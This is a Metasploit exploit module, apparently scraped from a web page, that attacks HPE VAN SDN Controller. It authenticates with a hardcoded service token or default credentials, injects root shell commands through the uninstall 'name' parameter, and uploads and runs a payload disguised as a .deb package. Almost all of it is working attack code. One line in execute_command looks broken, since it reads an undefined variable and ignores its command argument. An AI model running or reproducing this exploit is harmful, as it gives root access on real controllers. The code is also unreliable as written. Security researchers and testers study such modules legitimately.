# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  # server: grizzly/2.2.16
  HttpFingerprint = {pattern: [/^grizzly/]}

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP VAN SDN Controller Root Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a hardcoded service token or default credentials
        in HPE VAN SDN Controller <= 2.7.18.0503 to execute a payload as root.

        A root command injection was discovered in the uninstall action&#039;s name
        parameter, obviating the need to use sudo for privilege escalation.

        If the service token option TOKEN is blank, USERNAME and PASSWORD will
        be used for authentication. An additional login request will be sent.
      },
      &#039;Author&#039;         => [
        &#039;Matt Bergin&#039;, # Vulnerability discovery and Python exploit
        &#039;wvu&#039;          # Metasploit module and additional ~research~
      ],
      &#039;References&#039;     => [
        [&#039;EDB&#039;, &#039;44951&#039;],
        [&#039;URL&#039;, &#039;https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Jun 25 2018&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;Unix In-Memory&#039;,
         &#039;Platform&#039;    => &#039;unix&#039;,
         &#039;Arch&#039;        => ARCH_CMD,
         &#039;Type&#039;        => :unix_memory,
         &#039;Payload&#039;     => {&#039;BadChars&#039; => &#039; &#039;}
        ],
        [&#039;Linux Dropper&#039;,
         &#039;Platform&#039;    => &#039;linux&#039;,
         &#039;Arch&#039;        => [ARCH_X86, ARCH_X64],
         &#039;Type&#039;        => :linux_dropper
        ]
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {&#039;RPORT&#039; => 8081, &#039;SSL&#039; => true}
    ))

    register_options([
      OptString.new(&#039;TOKEN&#039;,    [false, &#039;Service token&#039;, &#039;AuroraSdnToken37&#039;]),
      OptString.new(&#039;USERNAME&#039;, [false, &#039;Service username&#039;, &#039;sdn&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [false, &#039;Service password&#039;, &#039;skyline&#039;])
    ])

    register_advanced_options([
      OptString.new(&#039;PayloadName&#039;, [false, &#039;Payload name (random if unset)&#039;]),
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false])
    ])
  end

  def check
    checkcode = CheckCode::Safe

    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => &#039;/&#039;,
      &#039;headers&#039; => {&#039;X-Auth-Token&#039; => auth_token},
      &#039;ctype&#039;   => &#039;application/json&#039;,
      &#039;data&#039;    => {&#039;action&#039; => &#039;uninstall&#039;}.to_json
    )

    if res.nil?
      checkcode = CheckCode::Unknown
    elsif res && res.code == 400 && res.body.include?(&#039;Missing field: name&#039;)
      checkcode = CheckCode::Appears
    elsif res && res.code == 401 && res.body =~ /Missing|Invalid token/
      checkcode = CheckCode::Safe
    end

    checkcode
  end

  def exploit
    if [CheckCode::Safe, CheckCode::Unknown].include?(check)
      if datastore[&#039;ForceExploit&#039;]
        print_warning(&#039;ForceExploit set! Exploiting anyway!&#039;)
      else
        fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
      end
    end

    if target[&#039;Type&#039;] == :unix_memory
      print_status(&#039;Executing command payload&#039;)
      execute_command(payload.encoded)
      return
    end

    print_status(&#039;Uploading payload as fake .deb&#039;)
    payload_path = upload_payload
    renamed_path = payload_path.gsub(/\.deb$/, &#039;&#039;)

    register_file_for_cleanup(renamed_path)

    print_status(&#039;Renaming payload and executing it&#039;)
    execute_command(
      "mv #{payload_path} #{renamed_path} && " \
      "chmod +x #{renamed_path}"
    )
    execute_command(renamed_path)
  end

  def upload_payload
    payload_name = datastore[&#039;PayloadName&#039;] ?
                   "#{datastore[&#039;PayloadName&#039;]}.deb" :
                   "#{Rex::Text.rand_text_alphanumeric(8..42)}.deb"
    payload_path = "/var/lib/sdn/uploads/#{payload_name}"

    res = send_request_cgi(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => &#039;/upload&#039;,
      &#039;headers&#039; => {&#039;Filename&#039; => payload_name, &#039;X-Auth-Token&#039; => auth_token},
      &#039;ctype&#039;   => &#039;application/octet-stream&#039;,
      &#039;data&#039;    => generate_payload_exe
    )

    unless res && res.code == 200 && res.body.include?(&#039;{ }&#039;)
      fail_with(Failure::UnexpectedReply, "Failed to upload #{payload_path}")
    end

    print_good("Uploaded #{payload_path}")

    payload_path
  end

  def execute_command(cmd)
    # Argument injection in /opt/sdn/admin/uninstall-dpkg

    # Ensure we don&#039;t undergo word splitting
    injection = injection.gsub(/\s+/, &#039;${IFS}&#039;)

    print_status("Injecting dpkg -r #{injection}")

    send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => &#039;/&#039;,
      &#039;headers&#039; => {&#039;X-Auth-Token&#039; => auth_token},
      &#039;ctype&#039;   => &#039;application/json&#039;,
      &#039;data&#039;    => {&#039;action&#039; => &#039;uninstall&#039;, &#039;name&#039; => injection}.to_json
    }, 1)
  end

  def auth_token
    return @auth_token if @auth_token

    token    = datastore[&#039;TOKEN&#039;]
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]

    if token && !token.empty?
      print_status("Authenticating with service token #{token}")
      @auth_token = token
      return @auth_token
    end

    print_status("Authenticating with creds #{username}:#{password}")

    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => &#039;/sdn/ui/app/login&#039;,
      &#039;rport&#039;     => 8443,
      &#039;vars_post&#039; => {&#039;username&#039; => username, &#039;password&#039; => password}
    )

    unless res && res.get_cookies.include?(&#039;X-Auth-Token&#039;)
      print_error(&#039;Invalid username and/or password specified&#039;)
      return
    end

    @auth_token = res.get_cookies_parsed[&#039;X-Auth-Token&#039;].first
    print_good("Retrieved auth token #{@auth_token}")

    @auth_token
  end

end

